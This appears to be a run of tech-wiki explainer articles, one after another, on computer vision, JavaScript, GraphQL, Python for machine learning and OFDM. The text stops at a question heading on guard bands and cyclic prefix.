A 2017 developer survey shows TensorFlow 's popularity .
Source : DataBricks 2019 .
The easy approach to using CV in your applications is to invoke CV APIs : Microsoft Azure Computer Vision , AWS Rekognition , Google Cloud Vision , IBM Watson Visual Recognition , Cloud Sight , Clarifai , and more .
These cover image classification , face detection / recognition , emotion detection , optical character recognition ( OCR ) , text detection , landmark detection , content moderation , and more .
OpenCV is a popular multiplatform tool with C / C++ , Java and Python bindings , but it does n't have native GPU support .
For coding directly in Python , there 's also NumPy , SciPy and scikit - image .
A SimpleCV is great for prototyping before you adopt OpenCV for more serious work .
Computer Vision Toolbox from MathWorks is a paid tool but it can simplify the design and testing of CV algorithms including 3D vision and video processing .
C # and .NET developers can use AForge .
NET / Accord .
NET for image processing .
For using CNNs , TensorFlow is a popular tool .
The CUDA Toolkit can help you get the best performance out of GPUs .
Try Tesseract for OCR .
For more tools , see eSpace on Medium , ResearchGate and Computer Vision Online .
The world 's first digitized photograph .
Source : NIST 2007 .
Russell Kirsch at the National Bureau of Standards ( now called NIST ) asks , " What would happen if computers could look at pictures ?
" Kirsch and his colleagues developed equipment to scan a photograph and represent it in the world of computers .
They scanned a 5 cm x 5 cm photograph of Kirsch 's infant son into an array of 176 x 176 pixels .
Hubel and Wiesel experiment on how cats see .
Source : Demush 2019 .
Neurophysiologists David Hubel and Torsten Wiesel discovered that a cat 's visual cortex is activated not by objects but by simple structures such as oriented edges .
It 's only decades later that we use this in the design of CNNs .
Larry Roberts publishes his PhD thesis at MIT .
His idea is to create a 3D representation based on perspectives contained in 2D pictures .
This is done by transforming images into line drawings .
Soon after this , Roberts joins DARPA and becomes one of the founders of the ARPANET that eventually evolved into the Internet .
Roberts is considered to be the father of computer vision .
The summer of 1966 is considered the official birth of computer vision .
Seymour Papert of MIT 's AI Lab defines the " Summer Vision Project " .
The idea is to do segmentation and pattern recognition on real - world images .
The project proves too challenging for its time and not much is achieved .
Research in computer vision continues in the direction suggested by Roberts .
David Huffman and Max Clowes independently publish line labelling algorithms .
Lines are labelled ( convex , concave , occluded ) and then used to discern the shape of objects .
To overcome blindness , Kurzweil Computer Products came up with a program to do OCR .
This comes at a time when funding and confidence in AI was at its lowest point , now called the AI Winter of the 1970s .
Marr 's representational framework for vision .
Source : Leymarie 2006 .
David Marr suggests a bottom - up approach to computer vision ( his book was published posthumously in 1982 ) .
He states that his vision is hierarchical .
It does n't start with high - level objects .
Rather , it starts with low - level features ( edges , curves , corners ) from which higher level details are built up .
In the 1980s , this led to a greater focus on low - level processing and went on to influence deep learning systems .
Marr 's work is now considered a breakthrough in computer vision .
Interconnected layers of Fukushima 's Neocognitron .
Source : Fukushima 1980 , fig .
2 .
In 1980 , Kunihiko Fukushima designed a neural network called Neocognitron for pattern recognition .
It 's inspired by the earlier work of Hubel and Wiesel .
It includes many convolutional layers and may be called the first deep neural network .
Later this decade , math and stats begin to play a more significant role in computer vision .
Some examples of math - inspired contributions include the Lucas - Kanade algorithm ( 1981 ) for flow calculation , Canny edge detector ( 1986 ) , and eigenface for facial recognition ( 1991 ) .
In the early 1990s , in criticism of Marr 's approach , goal - oriented computer vision emerged .
The idea is that we often do n't need 3D models of the world .
For example , a self - driving car only needs to know if the object is moving away or towards the vehicle .
One of the proponents of this approach is Yiannis Aloimonos .
AlexNet wins the annual ImageNet object classification competition with the idea that depth of a neural network is important for accurate results .
AlexNet uses five convolutional layers followed by three fully connected layers .
It 's considered a breakthrough in computer vision , inspiring further research in its footsteps .
In 2015 , Microsoft 's ResNet of 152 layers obtained better accuracy .
JavaScript logo .
Source : Wikipedia 2019a .
JavaScript ( JS ) is a programming language and a core technology of the World Wide Web ( WWW ) .
It complements HTML and CSS .
HTML provides structured static content on the web .
CSS does the styling on the content , including animations .
JavaScript enables rich interactions and dynamic content .
JS started on the web and is executed within web browsers .
With the coming of Node.js in 2009 , it became possible to use JS for server - side execution .
It 's now possible to build entire web apps with JS for both frontend and backend code .
Today , the JS ecosystem is rich and mature with many libraries , frameworks , package managers , bundlers , transpilers , runtimes , engines and IDEs .
Technically , JavaScript is a loosely typed , multi - paradigm , interpreted high - level language that conforms to the ECMAScript specifications .
What 's unique about JavaScript that one would want to learn ?
JavaScript is being used in various application areas .
Source : Voss 2018 .
JavaScript is the language of the web .
It 's one of the three core technologies of the World Wide Web , along with HTML and CSS .
JS enables dynamic effects and interactions on webpages .
Hence , it 's become an essential part of web applications .
Static web pages are almost obsolete nowadays .
With the advent of NodeJS , JS was quickly adopted for server - side scripting .
JS can be used for both frontend ( client - side ) and backend ( server - side ) programming of web apps .
A developer therefore needs to learn only one language .
This is particularly important when there 's a demand for fullstack ( frontend + backend ) developers .
JavaScript is no longer limited to just client - side code .
It 's being used for both client - side and server - side code , on mobile devices , for IoT applications , desktop applications and more .
The importance of JavaScript is also highlighted by this quote from Eric Elliott . Software is eating the world , the web is eating software , and JavaScript rules the web .
How does JavaScript work on the web ?
JavaScript introduction and use cases .
Source : WinningWP 2018 .
JavaScript code can be embedded into HTML files or stored in separate ` * .js ` files that can be referenced from HTML files .
When browsers encounter the JS code , they will parse it and execute it on the fly .
JavaScript is an interpreted language , meaning that it 's not compiled in advance to machine code .
By the mid-2000s , AJAX became a common approach to using JS more effectively for a richer user experience .
With AJAX , user interactivity is continued while new content is fetched asynchronously in the background .
Traditionally , content on the web was served as individual HTML pages and each page had some interactivity enabled via JS and AJAX .
In the late 2010s , there was a shift towards building the entire app in JavaScript and updating the content via AJAX .
Such an app is called a Single Page Application ( SPA ) .
Since we can now run JS on both client and server , this gives us the flexibility to render part of the web page on the server and let the client complete the rest .
This approach leads to what we call Isomorphic or Universal Application .
Is JavaScript related to Java , VBScript , JScript and ECMAScript ?
Java and JavaScript are two different programming languages .
The name JavaScript itself was coined in 1995 because of a partnership between Netscape Communications ( that invented JavaScript ) and Sun Microsystems ( that invented Java ) .
Java syntax was introduced into JavaScript .
While Java was reserved for enterprise apps , JavaScript was positioned as a web companion to Java .
At about the same time , Java was also made available within web browsers as applets .
Today , Java and JavaScript are both popular languages .
When Microsoft got into web technology in the 1990s , its Internet Explorer ( IE ) browser needed an equivalent to what Netscape and Sun had with JavaScript and Java .
JScript and VBScript are therefore Microsoft scripting languages .
JScript is said to be very similar to JavaScript and enables dynamic content on IE .
This fragmentation meant that a web page written for Netscape would not work well on IE , and vice versa .
There was no standard and JavaScript was evolving far too quickly .
In this context , ECMAScript was born in 1997 as a standard for JavaScript .
Why is JavaScript called a multi - paradigm language ?
JavaScript is an object - oriented language .
It has objects , with properties and methods .
Functions are first - class objects that can be passed into other functions , returned from functions , bound to variables or even thrown as exceptions .
However , object inheritance is not done in the classical manner of C++ or Java .
It uses prototypal inheritance , inspired by Self language .
This makes the language flexible .
A prototype can be cloned and modified to make a new prototype without affecting all child instances .
It 's also possible to do classical inheritance in JavaScript .
Though being object - oriented , there are no classes in JavaScript but constructors are available .
Object systems can be built using either inheritance or aggregation .
Variables and methods can be private , public or privileged to the object .
Eric Elliott explains why he regards prototypal inheritance and functional programming as two pillars of JavaScript .
Closures provide encapsulation and the means to avoid side effects .
Thus , understanding closures is important for functional programming in JavaScript .
JavaScript can also be used in an imperative style using ` if - else ` conditions , ` for ` loops , and module - level variables .
Thus , JavaScript is multi - paradigm because it 's object - oriented , functional and imperative .
What are some important features of JavaScript that I should learn ?
Useful modern JS syntax explained .
Source : Fireship 2018 .
Beginners should first learn the basics of JS , in addition to HTML and CSS .
The Modern JavaScript Tutorial is a great place to start learning .
Some useful things to learn include effective console logging , destructuring , template literals , and spread syntax .
Explicit loops can be avoided by taking the functional programming approach with ` reduce ` , ` map ` and ` filter ` methods .
For asynchronous programming , you should learn about Promises and adopt the modern ` async / await ` syntax .
Get a good understanding of closures and partial application .
Use the arrow syntax of ES6 for more compact and readable code .
Other useful ES6 features to learn are ` const ` , multiline strings , default parameters , and module import / export .
What 's the difference between a JS engine and a JS runtime ?
The JS runtime includes the engine .
Source : Uttariello 2018 .
A JavaScript Engine parses JS code and converts it to a form that the machine can execute .
It includes the memory heap and the call stack .
Examples include Google 's V8 Engine ( Chrome ) , SpiderMonkey ( Firefox ) , JScript ( IE ) , and Chakra ( Microsoft Edge ) .
A JavaScript Runtime is an environment in which JS runs .
Web browsers are environments .
Node.js provides a runtime for server - side execution .
In a typical web app , the program may access the DOM , make AJAX calls , and call Web APIs .
These are not part of the language .
They are provided by the browser as part of the JS runtime .
Another important distinction is that the engine does synchronous processing .
It can process only one function at a time via the call stack .
On the other hand , the runtime can maintain a number of items in the callback queue .
A new item can be added at anytime to the queue and processed later when the call stack is free .
Thus , the runtime enables asynchronous processing .
As a beginner , what should I know about the JavaScript ecosystem ?
Consider the following : Frameworks : These simplify development by providing a structure , including design patterns such as MVC .
Examples include React , Angular , Vue , Backbone and Ember .
Libraries : Many developers release their code as JS packages / modules / libraries so that others can reuse them .
In December 2018 , about 836,000 libraries were available on NPM .
Package Managers : Developers use them to install and manage packages they require for their projects .
Examples include NPM and Yarn .
Packages are downloaded from known repositories on the web .
Linters : These catch errors or bad practices early .
Examples include Prettier and ESLint .
Module Bundlers : A project may have many dependent JS packages .
Bundlers combine them into far fewer files so that these can be delivered more efficiently to browsers and other runtimes .
Examples include Webpack and Browserify .
Task Runners : These enable automated development workflows such as minifying or concatenating files .
Examples include Gulp and Grunt .
Transpilers : Developers can write code in other languages ( CoffeeScript , TypeScript ) and then convert them into JavaScript .
Another use case is to write in modern ES6 syntax and transpile to syntax supported by older browsers .
Examples include Babel .
What are some concerns that developers have about JavaScript ?
Developers coming from languages such as C++ and Java , find JavaScript annoying in many ways : automatic semicolon insertion , automatic type coercion ( loose typing ) , lack of block scoping , lack of classes , unusual ( prototypal ) inheritance .
Another quirk is type mismatches between objects that are otherwise similar : ` " Hello world " ` of the type " string " versus ` new String("Hello world " ) ` of the type " object " .
Some of these are attributed to the hurried development of JavaScript .
Because there are many JS frameworks , libraries and tools , the choice of which one to adopt can be daunting .
In one example , it was shown that Vue.js was hardcoded to rely on ` yarn ` and this broke the workflow because the developer had only installed ` npm ` .
It 's also possible in the JS world to have a small project of just a few lines of code download lots of dependencies .
An average web app has over 1000 modules .
Because the language was designed in a hurry , it has design errors .
Developers can write bad JS code .
This prompted Douglas Crockford to write his now famous book titled JavaScript : The Good Parts .
In the early days , the history of JavaScript was somewhat tied to the history of web browsers .
Among the early browsers are WorldWideWeb , ViolaWWW , Erwise and Midas .
In 1993 , NCSA Mosaic appeared on the scene .
It supports multiple networking protocols and is able to display images inline .
It became popular and people began to see the potential of the web .
There 's no JavaScript at this point and the content shown on browsers are all static .
Marc Andreessen , one of the creators of Mosaic , has the vision that the web should be a lot more dynamic with animations and interactions .
He started Netscape Communications .
At Netscape , the idea is to invent a dynamic scripting language for the browser that would have simple syntax and appeal to non - programmers .
Brendan Eich was contracted by Netscape to develop " Scheme for the browser " . A Scheme is a language with simple syntax , dynamic and powerful .
Thus was born Mocha , which became part of the Netscape Communicator browser in May 1995 .
With competition from Microsoft and its Internet Explorer , Netscape partners with Sun Microsystems to make Java available in the browser .
At the same time , they recognize that Java is a beast not suited for the browser .
Together they announced JavaScript , which they describe as " an open , cross - platform object - scripting language designed for creating and customizing applications on the Net .
" To ride on the hype surrounding Java , JavaScript is positioned as a companion to Java , even based on Java .
JS becomes available in the beta version of Netscape Navigator 2.0 .
Mocha has become JS but less Scheme - like and more Java - like .
Microsoft introduced JScript . It 's an alternative to JavaScript .
It 's included in Internet Explorer 3.0 .
JScript can also be used for server - side scripting on Internet Information Services ( IIS ) web servers .
Server - side scripting is also possible with JavaScript in Netscape Enterprise Server .
However , only in 2009 does Node.js make server - side scripting with JS popular .
The ECMA organization publishes ECMAScript , documented as the ECMA-262 standard .
Web pages that conform to ECMAScript are guaranteed to work on all browsers , provided browsers support the standard .
JavaScript conforms to ECMA , while providing additional features .
ActionScript and JScript are other well - known implementations of ECMAScript .
Jesse James Garrett of Adaptive Path mentions a new term , AJAX , which expands to Asynchronous JavaScript + XML .
AJAX eliminates the need to reload an entire webpage to update small details .
It gives developers more flexibility to make their web apps more responsive and interactive .
Many projects in Google already use AJAX .
AJAX goes on to change the way web interactions are built with JS .
As a standard library , CommonJS was founded , mainly for JS development outside the browser .
This includes the use of JS for web servers , desktop and command line applications .
This is also the year when NodeJS was released , so that JS can be used for server - side scripting .
History of ECMAScript up to ES6 .
Source : French - Owen 2016 .
As a standard , ECMAScript 2015 ( ES2015 or ES6 ) is released .
ES6 is seen as a major update to the core language specifications , which have n't changed since ES5 of 2009 .
ES6 is expected to make JS coding easier , although it may take a while for browsers to support it fully .
JS dominates on GitHub in terms of pull requests .
Source : Putano 2017 .
JavaScript has the highest number of pull requests on GitHub , an open site for sharing code , particularly on open source projects .
A pull request is a way for developers to submit their contributions to a project .
The TensorFlow project releases TensorFlow.js to train and run Machine Learning ( ML ) models within a web browser .
This becomes an easy path for JS developers to get started with ML .
This is just one example to illustrate the versatility of JS .
With more than 9.7 million developers using JavaScript worldwide , JS is declared as the most popular programming language .
This is based on a survey of 21,700 developers from 169 countries .
JS has 2.4 million more developers than the next popular language .
However , some predict that JS may decline due to WebAssembly .
For interactions on the web , JS has been the only language of choice so far .
With WebAssembly , developers can potentially migrate to other languages .
GraphQL logo .
Source : GraphQL 2019a .
Often , when client apps wish to get data , they have to work with available REST APIs and live with their limitations .
To obtain data , they make multiple API calls .
In the process , they end up overfetching data and using only some of it .
On slow connections , this dampens the user experience .
GraphQL is an alternative to traditional REST APIs but it is not meant to replace REST .
You can describe your data with a well - defined GraphQL schema .
Clients have the flexibility to get as much data as needed .
While API calls are similar to querying databases , GraphQL is not a database language .
GraphQL also interfaces nicely with frontend - - - - - JavaScript frameworks such as React .
GraphQL was created on Facebook and then open sourced .
It 's now managed by GraphQL Foundation .
What exactly is GraphQL ?
Several REST endpoint requests can be replaced with a single GraphQL query .
Source : Poirier - Ginter 2019 .
GraphQL is described as " a query language for APIs and a runtime for fulfilling those queries with your existing data " .
You describe your data using a schema .
Clients then ask for exactly what they want and nothing more .
Thus , control is with the client rather than the server .
With SOAP or REST , clients have to work with well - defined endpoints , often making multiple calls to obtain a complete set of data .
With GraphQL , a single API call is sufficient to do the same .
GraphQL is not a database language .
GraphQL is also not an implementation .
It 's an open source specification that can be implemented in any language .
A GraphQL service sits between your app and the data .
It provides a layer of abstraction .
Based on a schema , it does validation of the queries and responses .
Its APIs are based on types and fields , not endpoints .
Clients no longer need to parse responses , since they get data in the form they want it .
Why do we need GraphQL when there 's already a REST API ?
A comparison of GraphQL and REST .
Source : AltexSoft 2019 .
It 's typical in REST to think of data as a resource .
Each resource is exposed via an API endpoint .
For example , data about a library would consist of books , authors , branch locations , members , staff , and so on .
Each of these is typically exposed at its own endpoint .
With GraphQL , the entire data is considered as a single interconnected graph of data points .
What does this mean ?
Suppose you wish to know about books written by an author and the branches where they are available .
With REST , we would need to make multiple queries since the information might come from multiple endpoints .
With GraphQL , a single request is sufficient since relationships among books , authors and branches are all part of the same data graph .
A book could be identified by a unique integer .
GraphQL can validate this .
Errors due to type mismatches are caught early by the GraphQL service instead of allowing applications to fail in unpredictable ways .
GraphQL also has a feature called Subscriptions that makes it easier to update applications with real - time data .
Why does GraphQL treat my data as a graph ?
The GraphQL query extracts a tree from the app data graph .
Source : Pandya 2016 .
GraphQL provides a layer of abstraction between the application and the data storage .
In this abstraction , GraphQL models data as nodes .
Connections between these nodes are edges .
Thus , data is a graph of interconnected objects rather than resources accessed via multiple endpoints .
We can call this the application data graph .
Consider a library 's catalogue of books .
Books and authors are the nodes and they are interconnected .
An author may have written multiple books .
A book may have co - authors .
If we query for a specific book and all its authors , GraphQL is basically extracting a subtree from the data graph .
Let 's note that a tree is also a graph but without any loops .
A tree has a hierarchical structure .
The beauty of GraphQL is that the query to obtain a subtree from the graph also has a similar tree structure .
We can say that the query and its response have the same data shape .
This makes it easier to write queries and process the responses .
What are the advantages of using GraphQL ?
GraphQL query , response and schema .
Source : Kurtula 2018 .
GraphQL is a specification .
Implementations of the GraphQL server in various languages are available .
Client implementations are also available to ease the developer 's job .
GraphQL does not impose how or where data should be stored .
Data may come from multiple databases or REST APIs .
There 's no need to discard your existing REST API endpoints .
GraphQL can work with them .
In any case , GraphQL presents a single source of truth .
GraphQL eliminates the need to build separate API endpoints for each type of client ( web vs mobile ) .
GraphQL eliminates the " chattiness " or the N+1 problem that 's inherent in REST APIs .
Another point of efficiency is that data is not overfetched .
An UI component can obtain all the data is needs without worrying about how this maps to databases or multiple endpoints .
Data fetching is declarative and UI - driven , which is also why many frontend - frameworks ( React , Angular , Vue ) interface nicely with GraphQL .
GraphQL is strongly typed .
With introspection , we can retrieve the GraphQL schema .
Versioning like done in REST APIs is not needed .
The GraphQL API can be updated at the field level .
What are the phases of a query in GraphQL ?
Execution phases of a GraphQL query .
Source : Devopedia 2019 .
A GraphQL has to be understood by a GraphQL service before it can respond with the correct data .
A GraphQL service tokenizes the query string and then parses the tokens to build the Abstract Syntax Tree ( AST ) .
It then validates the query against the schema .
If invalid , an error response is returned .
If valid , the AST may be reduced to a form that 's simpler to execute .
If there are any defined query analyzers , they will be called .
During execution , resolvers are called to obtain the actual data pertaining to each field .
The GraphQL client is not part of the GraphQL specifications but clients simplify processing .
Different clients handle the queries and responses differently .
For example , Apollo Client normalizes the response and caches it .
It also minimizes the original query for efficiency .
Could you briefly introduce common GraphQL terms ?
Apollo Docs has published a handy GraphQL glossary .
Another source is GraphQL 's learning page .
Here we describe some essential terms : Query : A read - only operation to get data from a GraphQL service .
Mutation : While a query could be designed to do data writing , this is not recommended .
An explicit mutation is recommended .
Field : The basic unit of data that we can obtain .
GraphQL is in fact about selecting fields on objects .
Fragment : A set of fields that can be reused across multiple queries .
Argument : Every field and nested object can have an argument , thus enabling us to filter or customize the results .
Alias : To avoid naming conflicts in the results , aliases are useful .
For instance , we can query the same object with different arguments and get the results in different aliases .
Directive : This can be attached to a field or fragment to dynamically affect the shape of data .
Mandatory directives are ` @include ` and ` @skip ` to either include or skip a field based on a condition .
What are some criticisms of GraphQL ?
It 's been said that REST can do what GraphQL does .
Using the JSON API , we can implement data - specific queries .
Query parameters can filter data .
The JSON Schema can be used for type validation .
OData can be used as a query language .
These alternatives are better for small applications where GraphQL can be overkill .
GraphQL comes with the need to write resolvers .
Error handling is more complex since the response has to be parsed .
An error will be returned as a HTTP 200 OK status .
This also means that we ca n't use monitoring tools that mostly ping an endpoint without a request body and look at only status codes .
Unlike POST / PUT requests of REST , GraphQL ca n't do file uploading .
REST calls conform to HTTP semantics and web caching is easier due to multiple endpoints .
With GraphQL , given a single endpoint , web caching is harder to implement .
Tools such as Relay or Dataloader can help .
Apollo client - server implemented persisted GraphQL queries .
Performance can be an issue since clients can construct complex queries .
This is more so for data coming from third parties .
With REST , an endpoint can be designed and fine tuned for a specific query .
Facebook 's iOS and Android apps have become native apps .
This needs an API to retrieve Facebook 's News Feed .
RESTful APIs and Facebook Query Language ( FQL ) are available , but developers see a gap between what apps want and the queries that servers expose .
Developers had to write a lot of code on the server side to prepare data and on the client side to consume it .
It 's to solve this problem that Nick Schrock of Facebook created a first prototype called SuperGraph .
This is renamed GraphQL .
Facebook open source GraphQL , which has also been released as a draft specification .
This move is partly influenced by Facebook 's React that was open sourced in 2013 , Facebook 's React Native that was also open sourced in 2015 and Facebook 's Relay that provides a framework for building mobile apps based on React , React Native and GraphQL .
GraphQL specifications exit " Draft RFC " status .
It defines Type System Definition Language and delivery of live data over GraphQL subscriptions .
The GraphQL Foundation has been formed , to be hosted by the Linux Foundation .
This paves the way for a vendor - neutral development of GraphQL .
By now , GraphQL is being used by Airbnb , Audi , GitHub , Netflix , Shopify , Twitter , NY Times and many more .
On Facebook alone , it powers billions of API calls every day .
In March 2019 , GraphQL Foundation announced collaboration with the Joint Development Foundation .
ML in Python .
Source : https://www.mcal.in/machinelearning-python/ Machine Learning algorithms enable a computer system to learn about the problem environment directly from historical / real time data , without being explicitly programmed .
Algorithm implementation can be done using any programming language such as C , C++ , Java , Python , JavaScript or R. However , Python is most prevalently used in the industry for Machine Learning across business domains .
It was voted by data scientists as the ‘ language most desirable to learn ’ in a 2018 StackOverflow survey .
Several factors influence the choice of language for ML implementation .
Programming expertise in organisation , interoperability with existing code / data frameworks might be reasons to stick to traditional languages such as C++ or Java .
But the advantages that new - age languages such as Python and R bring to Machine Learning are plenty .
The ease of coding , strong supporting developer community , and excellent data manipulation features are key reasons for Python ’s suitability for Machine Learning .
What are the major steps in the ML process and its corresponding Python libraries ?
Machine Learning programs essentially consist of 4 steps .
In Python , each of these steps is supported by a well - developed library implementations : Step 1 – Collecting and preparing data ( ` numpy ` , ` pandas ` library ) Step 2 – Choosing the model or algorithm ( ` sklearn ` library ) Step 3 – Training the model with historical data ( ` sklearn ` library ) Step 4 – Making an outcome prediction from training data and comparing the accuracy with the test data ( ` matplotlib ` , ` sklearn ` libraries ) How is the data collection process ( Step 1 ) handled in Python ?
Data about the system is first collected from various sources .
This data would primarily be unstructured data , containing unclear labels and several invalid / incorrect entries .
This data is then sorted , labelled , validated and then stored in organized data structures .
The NumPy and Pandas libraries of Python contain data structures such as ` Array ` , ` DataFrame ` and ` Series ` that provide grouping , indexing and data manipulation functions .
How is the ML model chosen and implemented ( Step 2 ) in Python ?
A cheatsheet from scikit - learn guides data scientists in choosing the right estimator for their ML problem .
Source : scikit - learn 2018b .
Once the data is ready , it is divided into training and test data .
Here , the appropriate ML algorithm is applied based on the nature of the data and the type of prediction we seek .
The size of the training data , linearity of data , the number of affecting parameters are all important factors to consider .
Linear regression , classification , SVM , Clustering , Decision trees are some of the frequently used algorithms .
All popular algorithm implementations are present in the ` sklearn ` ( scikit - learn ) library of Python .
It provides a list of supervised and unsupervised algorithms with a uniform interface for invocation for easy programming .
How is the ML model trained with data ( Step 3 ) using Python ?
Feeding the model with all the gathered data and allowing it to interpret the parameters incrementally is the next step .
The training process involves deducing values for dependent variables based on independent variable values in the data set .
Some variables are more relevant to the outcome than the others .
The ` estimator.fit ( ) ` function from the ` sklearn ` library allows the model to take the test X values and fit them into the model to infer the corresponding Y value .
Supervised learning is done using either ` predictor.predict ( ) ` or ` predictor.predict_prob ( ) ` ( for classification problems ) .
How is the final outcome predicted and evaluated ( Step 4 ) in Python ?
A heatmap visualization generated with geoplotlib package .
Source : Bierly 2016 .
In the final step , the derived Y values from the model are verified and evaluated for accuracy .
This is done by comparing the derived Y value against the Y value from test data .
The high degree of accuracy indicates a good fit of the model to the problem statement , meaning the predictions are reliable .
Once the outcomes are ready , the data needs to be presented in easy human - readable form .
This step is known as data visualization .
It involves converting tabular data into visual representations such as graphs , maps , images , and so on .
Python takes care of prediction with the ` sklearn ` library .
The accuracy calculation functions are also present in this .
Data visualization is done using the ` matplotlib ` library .
Popular visualizations are scatter plots , time series , box plots , histograms and heatmaps .
Refer to the code snippet in the sample code section .
What are the advantages of Python over other programming languages for Machine Learning ?
Listed below are some distinct features of Python that make it extremely suitable for ML : Ease of coding – Often described as a programmer ’s delight , Python ’s code footprint is among the smallest among high level languages .
Short , to - the - point syntax is a big plus , making programs easily readable .
Dynamic typing – Python does n’t mandate you to declare variable data types .
So mid - way through your program , your variable can change from integer to character to an object .
When large volumes of data are being collected , sometimes a variable data type is unknown or frequently changing .
Thus , the dynamic typing feature is useful in data preparation for Machine Learning .
Strong developer community – The open and collaborative development of Python libraries has made it one of the fastest growing developer communities .
Quick consultation for queries and excellent sample code sharing make it easy for beginners .
Since ML is an emerging field , community support is a vital plus .
Embeddable code – Python code can be embedded as script snippets into traditional C , C++ or Java programs .
This makes feature extensions easy , as the legacy code need not be scrapped altogether .
What are the disadvantages of Python and when to use alternative programming languages for Machine Learning ?
Python also comes with some inherent drawbacks .
Dynamic typing presents a problem to handling efficient memory management and garbage collection .
So whenever performance - critical features are implemented , better stick to C / C++ code , and make them Python extensions .
Python is not the ideal choice for real - time data analysis either , due to its slower processing speed than C / C++ .
R is another extremely popular language for Machine Learning as it is a language designed especially for scientific computation and statistical analysis , unlike Python , which is a general - purpose high - level language .
When an algorithm relies heavily on Java features ( such as Android , IOT sensors , JDBC extensions ) , it is quite natural to write the ML portion also in Java .
How are advanced ML features supported in Python ?
ML Libraries and Frameworks in Python .
Source : https://www.ipsr.edu.in / wp - content / uploads/2018/10 / image1.png Apart from general purpose Machine Learning , there are other allied applications such as Deep Learning , Neural Networks , and Natural Language Processing .
These form the basket of frameworks for Artificial Intelligence .
Python is ahead of alternative languages in support for such advanced applications .
Among the ML frameworks or packages are TensorFlow , Keras , PyTorch , fastai , Caffe2 , Scikit - Learn , and Chainer .
Theano is an old DL framework that 's no longer maintained .
In many frameworks , the underlying implementation may be in another language , but they expose Python APIs for use in Python - based applications .
Popular Deep Learning frameworks include TensorFlow from Google , and PyTorch from Facebook .
Although primarily written in C++ , developers can use Python APIs to invoke these frameworks .
They do , however , have interfaces in C++ , R , and Java .
For Natural Language Processing ( NLP ) , the NLTK Python library is widely used .
There are also Patterns for data mining , NLP , and ML .
Image processing functions are supported by OpenCV , scikit - image , and Pillow frameworks .
Could you mention some relevant tools for ML in Python ?
For general scientific computing , SciPy is a handy package .
Dask enables parallel computing .
High Performance Analytics Toolkit ( HPAT ) is an alternative to Apache Spark to scale your apps to multiple clusters on the cloud .
To optimize your code for performance , consider using Numba and Cython .
To run efficiently on specific hardware , Intel offers Intel ® Math Kernel Library ( MKL ) and Intel ® Distribution for Python .
Likewise , PyCUDA allows Python code to access Nvidia 's CUDA parallel computation API .
Among the IDEs suitable for ML applications in Python are JuPyter / IPython Notebook , PyCharm ( free or paid ) , Spyder , Rodeo , and Geany .
Rodeo has been built specifically for ML and Data Science .
Among the data visualization packages in Python are Matplotlib , Seaborn , ggplot , Bokeh , pygal , Plotly , geoplotlib , Gleam , Missingno , and Leather .
Many are capable of many types of plots , while others fulfil specific needs .
This is the decade when Machine Learning algorithms move from being rule - driven to data driven .
Python 2.0 is released .
The development of the language has become more open and community driven .
The NumPy package of Python , for scientific computing is released .
Statistical modelling for machine learning becomes simpler with this package .
Python 3.0 has been released .
Memory management is becoming more efficient .
This helps us process large data structures , as is common in ML .
The Pandas package of Python , for data manipulation and processing , has been released .
This simplifies data clean up and pre - processing , which are the first steps in a typical ML data pipeline .
The Scikit - learn package of Python sees its public release .
It covers all the major ML algorithm implementations such as for regression , classification and clustering .
This library simplifies ML programming for developers .
ML Deep Learning Frameworks in Python .
Source : Fojo et al .
2018 , slide 29 .
Several Python - based Deep Learning ( DL ) frameworks ( TensorFlow , Chainer , Keras ) have been released .
TensorFlow , the most popular of them , is an open source Python library for fast numerical computing .
Developed by the Google Brain team , it comes with strong support for Machine Learning and Deep Learning .
Its flexible numerical computation core is used across many other scientific domains .
Facebook brings GPU - powered Machine Learning to Python .
PyTorch is a Python implementation of the Torch Machine Learning framework for deep neural network programming .
It can complement or partly replace existing Python packages for math and stats , such as NumPy .
Orthogonal Frequency Division Multiplexing ( OFDM ) is a key wideband digital communication method used in wireless transmission .
Data is split into several streams and transmitted on multiple narrowband channels to reduce interference and crosstalk .
Due to its good spectral efficiency and relatively less complexity , it 's one of the popular techniques used in telecommunications .
It 's used in multiple standards , including DAB , HDTV , WLAN ( 802.11a / g / ac ) , WiMAX , and LTE .
It enables transmission of high data rates ( on the order of 1 Gbps ) on a wireless channel .
Could you give an overview of OFDM ?
Comparing multi - carrier modulation schemes FDM and OFDM .
Source : DK 2012 .
OFDM is a Multi - Carrier Modulation ( MCM ) scheme , which uses closely spaced multiple subcarriers to transmit data .
Data to be transmitted is split and transmitted using multiple subcarriers instead of using a single carrier .
The key idea is , instead of transmitting at a very high bit rate , the data is transmitted over multiple subchannels , each carrying lower bit rates .
Unlike traditional Frequency Division Multiplexing ( FDM ) , the OFDM does not use guard bands to separate the various subchannels .
One of the key features of OFDM is the orthogonality of the subcarriers used to transmit data .
The orthogonality of subcarriers results in more subcarriers at a given bandwidth .
This improves spectral efficiency .
It also eliminates the interference between subcarriers , often called Inter - Carrier Interference ( ICI ) .
Why is OFDM used in wireless transmission ?
One of the key challenges in wireless transmission as compared to wired transmission is the phenomenon of multipath fading and Inter - Symbol Interference ( ISI ) .
OFDM helps in mitigating both these effects , making it one of the key technologies to be used in wireless transmission .
OFDM uses spectrum in a more efficient way compared to some of the other techniques used to overcome multipath fading and Inter Symbol Interference .
How does OFDM ensure subcarriers do not interfere with each other ?
OFDM signal frequency spectra .
Source : Keysight Technologies 2000a .
OFDM splits the available spectrum into multiple subbands and transmits data using multiple subcarriers .
The subcarriers are chosen such that they are orthogonal to each other .
This ensures that data from one subcarrier does not interfere with the data from the other .
To maintain orthogonality between subcarriers , the subcarriers are chosen such that they are all integer multiples of the base frequency .
If the total bandwidth of the system is B Hz .
Then the base frequency ( f0 ) is given by B / N , where N is the number of subcarriers in the system .
The subcarriers used are f0 , 2f0 , 3f0 ... ( N-1)f0 .
The spectrum of each transmitted subcarrier in the OFDM system is a ` sinc ` function with side - lobes that produce overlapping spectra between subcarriers .
Since the carriers are orthogonal , the peak of each subcarrier coincides with the nulls of other subcarriers .
Even though there 's overlap of spectra between subcarriers , there 's no interference between subcarriers .
What 's the role of FFT and IFFT in OFDM implementation ?
The OFDM system involves mapping of symbols onto a set of orthogonal subcarriers that are multiples of the base frequency .
This can be implemented in the digital domain using Fast Fourier Transform ( FFT ) and Inverse Fast Fourier Transform ( IFFT ) .
These transforms are important from an OFDM perspective as they can be viewed as mapping digital input data onto orthogonal subcarriers .
The IFFT takes frequency - domain input data and converts it to the time - domain output data ( analog OFDM symbol waveform ) .
This waveform is transmitted by the OFDM transmitter .
The receiver receives the waveform and uses FFT transform to convert the data back from the time - domain into the frequency domain to recover the data back .
What are guard band and cyclic prefix in OFDM ?
